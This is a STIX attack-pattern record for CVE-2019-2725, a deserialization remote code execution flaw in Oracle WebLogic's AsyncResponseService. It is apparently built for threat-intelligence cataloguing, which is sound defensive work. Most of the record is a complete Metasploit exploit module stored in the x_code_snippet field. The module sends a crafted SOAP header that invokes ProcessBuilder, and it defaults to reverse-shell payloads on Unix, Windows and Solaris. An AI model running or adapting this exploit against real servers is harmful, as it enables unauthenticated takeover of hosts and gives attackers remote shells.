{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc37517e-db8d-406c-a16d-2ad4ec6b11f7",
    "created": "2024-08-14T17:06:43.201949Z",
    "modified": "2024-08-14T17:06:43.201953Z",
    "name": "Oracle Weblogic Server Deserialization RCE - AsyncResponseService ",
    "description": " An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a malicious SOAP request to the interface WLS AsyncResponseService to execute code on the vulnerable host. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/weblogic_deserialize_asyncresponseservice.rb",
            "external_id": "weblogic_deserialize_asyncresponseservice.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-2725"
        },
        {
            "source_name": "reference",
            "url": "http://www.cnvd.org.cn/webinfo/show/4999"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/F5Labs/status/1120822404568244224"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle Weblogic Server Deserialization RCE - AsyncResponseService ',\n        'Description' => %q{\n          An unauthenticated attacker with network access to the Oracle Weblogic Server T3\n          interface can send a malicious SOAP request to the interface WLS AsyncResponseService\n          to execute code on the vulnerable host.\n        },\n        'Author' => [\n          'Andres Rodriguez - 2Secure (@acamro) <acamro[at]gmail.com>', # Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2019-2725'],\n          ['URL', 'http://www.cnvd.org.cn/webinfo/show/4999'],\n          ['URL', 'https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html'],\n          ['URL', 'https://twitter.com/F5Labs/status/1120822404568244224']\n        ],\n        'Privileged' => false,\n        'Platform' => %w[unix win solaris],\n        'Targets' => [\n          [\n            'Unix',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Solaris',\n            {\n              'Platform' => 'solaris',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' },\n              'Payload' => {\n                'Space' => 2048,\n                'DisableNops' => true,\n                'Compat' =>\n                {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'generic perl telnet'\n                }\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 12\n        },\n        'DisclosureDate' => '2019-04-23',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7001),\n        OptString.new('TARGETURI', [true, 'URL to AsyncResponseService', '/_async/AsyncResponseService'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'ctype' => 'text/xml',\n      'headers' => { 'SOAPAction' => '' }\n    )\n\n    if res && res.code == 500 && res.body.include?('<faultcode>env:Client</faultcode>')\n      vprint_status(\"The target returned a vulnerable HTTP code: /#{res.code}\")\n      vprint_status(\"The target returned a vulnerable HTTP error: /#{res.body.split(\"\\n\")[0]}\")\n      Exploit::CheckCode::Vulnerable\n    elsif res && res.code != 202\n      vprint_status('The target returned a non-vulnerable HTTP code')\n      Exploit::CheckCode::Safe\n    elsif res.nil?\n      vprint_status('The target did not respond in an expected way')\n      Exploit::CheckCode::Unknown\n    else\n      vprint_status(\"The target returned HTTP code: #{res.code}\")\n      vprint_status(\"The target returned HTTP body: #{res.body.split(\"\\n\")[0]} [...]\")\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    print_status('Generating payload...')\n    case target.name\n    when 'Windows'\n      string0_cmd = 'cmd.exe'\n      string1_param = '/c'\n      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, { remove_comspec: true, encoded: false })\n    when 'Unix', 'Solaris'\n      string0_cmd = '/bin/bash'\n      string1_param = '-c'\n      shell_payload = payload.encoded\n    end\n\n    random_action = rand_text_alphanumeric(20)\n    random_relates = rand_text_alphanumeric(20)\n\n    soap_payload = %(<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\")\n    soap_payload << %(xmlns:wsa=\"http://www.w3.org/2005/08/addressing\")\n    soap_payload << %(xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">)\n    soap_payload << %(<soapenv:Header>)\n    soap_payload << %(<wsa:Action>#{random_action}</wsa:Action>)\n    soap_payload << %(<wsa:RelatesTo>#{random_relates}</wsa:RelatesTo>)\n    soap_payload << %(<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">)\n    soap_payload << %(<void class=\"java.lang.ProcessBuilder\">)\n    soap_payload << %(<array class=\"java.lang.String\" length=\"3\">)\n    soap_payload << %(<void index=\"0\">)\n    soap_payload << %(<string>#{string0_cmd}</string>)\n    soap_payload << %(</void>)\n    soap_payload << %(<void index=\"1\">)\n    soap_payload << %(<string>#{string1_param}</string>)\n    soap_payload << %(</void>)\n    soap_payload << %(<void index=\"2\">)\n    soap_payload << %(<string>#{shell_payload.encode(xml: :text)}</string>)\n    # soap_payload <<             %Q|<string>#{xml_encode(shell_payload)}</string>|\n    soap_payload << %(</void>)\n    soap_payload << %(</array>)\n    soap_payload << %(<void method=\"start\"/>)\n    soap_payload << %(</void>)\n    soap_payload << %(</work:WorkContext>)\n    soap_payload << %(</soapenv:Header>)\n    soap_payload << %(<soapenv:Body>)\n    soap_payload << %(<asy:onAsyncDelivery/>)\n    soap_payload << %(</soapenv:Body>)\n    soap_payload << %(</soapenv:Envelope>)\n\n    print_status('Sending payload...')\n\n    begin\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path),\n        'method' => 'POST',\n        'ctype' => 'text/xml',\n        'data' => soap_payload,\n        'headers' => { 'SOAPAction' => '' }\n      )\n    rescue Errno::ENOTCONN\n      fail_with(Failure::Disconnected, 'The target forcibly closed the connection, and is likely not vulnerable.')\n    end\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'No response from host')\n    elsif res && res.code != 202\n      fail_with(Failure::UnexpectedReply, \"Exploit failed.  Host responded with HTTP code #{res.code} instead of HTTP code 202\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-23",
    "x_mitre_platforms": [
        "solaris'"
    ]
}